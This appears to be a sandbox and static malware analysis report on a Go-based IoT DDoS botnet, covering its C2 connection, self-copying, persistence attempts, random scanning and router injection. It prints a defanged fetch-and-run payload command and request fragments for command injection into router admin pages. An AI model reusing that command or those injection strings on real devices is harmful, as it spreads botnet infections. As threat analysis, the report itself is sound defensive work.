> A 32-bit x86 statically linked Go program (go1.25.0, module path Botnet/Bot); on startup it immediately tries to connect to the CNC controller at 185[.]226[.]92[.]31:9111, then drops a copy of itself named sysd in a writable directory, attempts to write rc.local/.bashrc persistence, and prints the scanner payload wget hxxp://185[.]226[.]92[.]31/bins.sh; chmod +x bins.sh; ./bins.sh. The binary contains complete DDoS attack implementations (UDP/TCP/TLS/TLS+/Cloudflare/HTTP2 browser emulation/SYN raw socket/NTP amplification etc.) and router-management-interface injection code; the dynamic run directly reproduced the CNC connection attempt, persistence probing and payload-delivery command, so it is judged a malicious IoT DDoS botnet.

## Behavior Analysis

There are **10** behaviors in total, each backed by evidence; **5** are statically available and **5** were obtained through dynamic analysis.

### 1. Connects to the CNC controller

`T1095` · Confidence **high** · Dynamic

After startup it initiates a TCP connection to 185[.]226[.]92[.]31:9111 (plaintext custom protocol) and repeatedly prints Connecting to CNC... while retrying; once connected it enters the command loop.

> **Evidence**: main.main 0x8275960 reads global strings 0x85c6508 (pointer 0x83f7470="185.226.92[.]31.") and 0x85c6510 (pointer 0x837a970="9111"); dynamic stderr repeatedly outputs Connecting to CNC...
> 
> **Source**: `ref:f3bd75a045` · `ref:a447c51a36` · `ref:c193601bb9`

### 2. Probes writable directories and drops itself

`T1036.005` · Confidence **high** · Dynamic

It creates test_write under /usr/bin/, /data/local/tmp/, /tmp/ and /var/run/ in turn to test writability, and after choosing one copies itself (/proc/self/exe) to the disguised name sysd.

> **Evidence**: main.AutoStart 0x8278250 references 0x837b707="/usr/bin/", 0x837dea4="/data/local/tmp/", 0x837ab3c="/tmp/", 0x837b710="/var/run/" and 0x837bc7b="test_write" in turn; dynamic syscalls: unlinkat /tmp/test_write, openat("/tmp/sysd", O_CREAT|O_TRUNC)
> 
> **Source**: `ref:fa07d4a162` · `ref:cc7b42bc79` · `ref:0dff242bdc`

### 3. Plants boot autostart entries

`T1037.004` · Confidence **medium** · Dynamic

It appends its own launch command to /etc/rc.local, /etc/rc.d/rc.local, /root/.bashrc and /home/user/.bashrc, achieving autostart after reboot/login.

> **Evidence**: static strings "/etc/rc.local/root/.bashrc" (0x334c74), "/etc/rc.d/rc.local/home/user/.bashrc" (0x336bbc); dynamic fstatat64("/etc/rc.local")=ENOENT, openat("/root/.bashrc")=EACCES, item-by-item probe accesses observed
> 
> **Source**: `ref:ec7944d17a` · `ref:0dff242bdc`

### 4. Randomly scans public addresses

`T1046` · Confidence **high** · Dynamic

main.StartScanner generates random public IPv4 addresses (skipping private/reserved ranges), probing Web management ports of routers and IoT devices in batches to find injectable targets.

> **Evidence**: main.StartScanner 0x8279180, main.generateRandomIP 0x82793c0, main.isPrivateIP 0x8279530; dynamic stdout "Scanner started. Payload (Loader): ..."
> 
> **Source**: `ref:2287a50ed1` · `ref:c193601bb9`

### 5. Injects into router management interfaces

`T1190` · Confidence **high** · Static

For surviving devices it attempts login (login_btn/username/password) and command injection, abusing management interfaces such as syscmd.htm, setting/getSanvas and setting/setUserLogin to run system commands.

> **Evidence**: strings "&apply=Apply&submit-url=%2Fsyscmd.htm&msg=", "submit-url=%2Fsyscmd.htm&sysCmdselect=5&...&sysCmd=", "{\"topicurl\":\"setting/setUserLogin\",\"username\":\"", "{\"topicurl\":\"setting/getSanvas\"}"; functions main.checkSyscmd 0x827c340, main.findSysCmd 0x827c050, main.loginDevice 0x827b540

## Do Not Misjudge

:::important
The following conclusions are **easy to misjudge**; please note them when citing this report.

- Do not claim the sample uses custom encryption or has ransomware encryption capability because an AES S-box (0x566520) and a base64 alphabet appear in the binary — these constants come from the Go standard library crypto/tls and encoding/base64, and no custom encryption configuration or file-encryption routine was found in this sample.
- Do not claim a successful CNC connection or that attack commands were received: the isolated environment has no external network, only repeated printing of Connecting to CNC... was observed, and no successful session or command interaction occurred.
- Do not treat bins.sh as a payload that was downloaded and executed: only the delivery command printed by the scanner exists, and no completed download or script execution was observed.
- Do not claim persistence took effect: the analysis process was non-root, /etc/rc.local did not exist and /root/.bashrc returned permission denied; only probe/access attempts were observed and no successful write was seen.
- Do not classify this sample as ransomware/wiper: there is no file-traversal encryption, deletion or destruction logic; its core capability is DDoS command execution and device propagation.
:::

## Analysis Method and Limitations

| Item | Content |
|:--|:--|
| Analysis method | Dynamic sandbox analysis (Linux sample) + static decompilation |
| Unpacking | No |

**Limitations and pending verification**

1. The isolated execution environment has no external network (unshare -n); only the CNC connection attempt and timeouts were observed, with no C2 session, command or remote configuration obtained; the recoverability of c2 and download URLs is handled statically and marked pending dynamic verification.
2. The analysis process ran as non-root and the container lacked /etc/rc.local, so persistence writes and root-requiring raw-socket attacks (handshake/VOULT forged-source-IP) could not actually be triggered.
3. The real dynamic window was about 12–25 seconds, covering only the startup stage, autostart handling and scanner start; the full attack-command cycle did not run and config.dat and the proxies list were not captured.
4. The family name is a self-evidenced candidate based on the module path and feature set, lacking vendor-engine/YARA naming corroboration, hence low confidence.
5. The content and hash of the /tmp/sysd copy were not obtained (unavailable after instance reclamation), so that copy cannot be compared as an independent stage artifact.
